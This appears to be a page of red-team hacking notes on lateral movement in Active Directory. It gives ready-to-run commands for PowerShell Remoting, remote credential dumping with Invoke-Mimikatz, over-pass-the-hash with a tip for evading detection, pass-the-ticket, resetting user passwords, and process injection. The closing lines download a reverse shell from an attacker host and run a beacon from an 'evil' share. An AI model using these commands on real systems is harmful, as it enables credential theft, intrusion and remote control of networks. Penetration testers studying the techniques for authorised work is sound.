---
title: Lateral Movement
category: Active Directory
order: 3
---

# PowerShell Remoting

Once a machine is compromised, we need to jump to others in order to find more valuable targets. For that task we can use `PowerShell Remoting` which is increasingly used in enterprises and enabled by default on Server 2012 onwards. PowerShell Remoting uses WinRM protocol, so you can check `evil-winrm` tool. Admin privileges on the target machineis needed.

> **Note**: Maybe you need to enable remoting `Enable-PSRemoting` on a Desktop windows machine and Admin privs are required.

You can get a elevated shell (`NT AUTHORITY\SYSTEM`) on the remote server if the credentials of the user administrator are used to authenticate (default setting).

## Using Credentials

We can use other credentials:
```
$user='WORKGROUP\User'; 
$pass='passwd';
$cred = (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))
```
And use it with the parameter `-Credential`

> **Note**: If password is not declared a prompt will be shown in order to enter manually.

## Creating a Session

There are two types of PowerShell Remoting:

* **One-to-One**: It is interactively login to another machine. Create a new session on the target machine so runs in a new process (wsmprovhost). 

```powershell
Enter-PSSession -ComputerName machine01.corp.local
Enter-PSSession -ComputerName machine01.corp.local -Credential $cred
Enter-PSSession -ComputerName machine01.corp.local -Credential corp\user
```
We can also first create the session and append to it later.

```powershell
$sess = New-PSSession -ComputerName machine01.corp.local
Enter-PSSession -Session $sess
```
> **Note**: We can put a session in background if the session is stored in a variable. Very useful.


* **One-to-Many**: It is also known as Fan-out remoting. It is a non-interactive shell but we can execute commands parallely. Is useful to run commmands and scripts on multiple remote computers, in disconnected sessions and as a background job.

```powershell
Invoke-Command -ComputerName machine01.corp.local -ScriptBlock {whoami;hostname}
Invoke-Command -ComputerName (Get-Content .\servers.txt)
Invoke-Command -ComputerName machine01.corp.local -FilePath .\file.ps1
```
> **Note**: One of the best things in PowerShell to do PassTheHash, using credentials and executing commands on multiple remote computers.

> **RedTeam Note**: Since admin privs are needed is a useful tool to check if the user has admin privs on the target machine.

## Execute locally loaded funcitons on the remote machine

We can execute locally loaded function on the remote machine.

```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content .\servers.txt)
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ArgumentList "-List hello" -ComputerName (Get-Content .\servers.txt)
```
## Load a script remotely

we can load a script remotely.

```powershell
Invoke-Command -FilePath .\hello.ps1 -Session $sess
Enter-PSSession -Session $sess

[machine01.corp.local]: PS C:\> hello
Hello World!
```
## Execute "Stateful" commands

We can execute "Stateful" commands.

```powershell
$sess = New-PSSession -ComputerName server1
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```
## Transfering files

We can also transfer files with PSRemoting and `Copy-Item`
```
$sess = New-PSSession -ComputerName server1
Copy-Item C:\Windows\remote_file.txt C:\Windows\local_file.txt -FromSession $sess
Copy-Item C:\Windows\local_file.txt C:\Windows\remote_file.txt -ToSession $sess
```

# Dump credentials

Once we have administrator privileges on the target machine we can dump credentials with `Invoke-Mimikatz`. See this section:

[https://mvc1009.github.io/hackingnotes/post-exploitation/get-credentials/](/hackingnotes/post-exploitation/get-credentials/).

To avoid save mimikatz on disk we need to load remotely.

```powershell
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Invoke-Command -Session $sess -ScriptBlock {Invoke-Mimikatz -DumpCreds}
```
Or we can execute locally loaded functions.

```powershell
. .\Invoke-Mimikatz.ps1
Invoke-Command -Session $sess -ScriptBlock {function:Invoke-Mimikatz -DumpCreds}
```

# Over-Pass-the-Hash / Pass-The-Key

Abusing kerberos functionality we can execute commands as another user by only knowing the NTLM hash.

* Invoke-Mimikatz

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<ntlmhash> /run:powershell.exe"'
```

> **RedTeam Note**: There is a different in encryption type for timestamp between a normal `krb-as-req` and one using the Over-Pass-the-hash `krb-as-req`
> * Over-Pass-the-hash krb-as-req etype flag: `eTYPE-ARCFOUR-HMAC-MD5 (23)`
> * Normal krb-as-req etype flag: `eTYPE-AES256-CTS-HMAC-SHA1-96 (18)`
>
> To reduce the cahnces of detection use `aes256`, `aes128` and `NTLM(RC4)` together.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local /aes256:<aes256> /aes128:<aes128> /ntlm:<ntlmhash> /run:powershell.exe"'
```

* Rubeus

```
.\Rubeus.exe asktgt /domain:dollarcorp.moneycorp.local /user:srvadmin /rc4:a98e18228819e8eec3dfa33cb68b0728 /ptt
```

# Pass-The-Ticket

We can use the tickets that are save to a `.kirbi` file. 

* Invoke-Mimikatz

```
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

* Rubeus

```powershell
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe ptt /ticket:<base64ticket>
```

# Manipulating User Passwords with Mimikatz 

Mimikatz supports the ability to manipulate user password, so we can change the password to a new one and restore it later.

```powershell
Invoke-Mimikatz -Command '"lsadump::changentlm /server:dc01 /user:jeff /old:<NTLM> /newpassword:<NTLM2>"'
```

```powershell
Invoke-Mimikatz -Command '"lsadump::setntlm /server:dc01 /user:jeff /ntlm:<NTLM>"'
```

* [https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/](https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/)

# Process Injection

We can also inject our shellcode or our binary to a process running by a user. Notice that **elevated privileges are needed**.

* [https://github.com/S3cur3Th1sSh1t/SharpImpersonation](https://github.com/S3cur3Th1sSh1t/SharpImpersonation)

Get a list of running processes:
```
.\SharpImpersonation.exe list elevated
```

Inject on a process which is run by a specific user:
```
.\SharpImpersonation.exe user:CORP\jwick binary:"powershell.exe"
.\SharpImpersonation.exe user:CORP\jwick binary:"powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://ipkali/rev.ps1')"
.\SharpImpersonation.exe user:CORP\jwick binary:"\\evil.corp.local\share\beacon.exe"
```
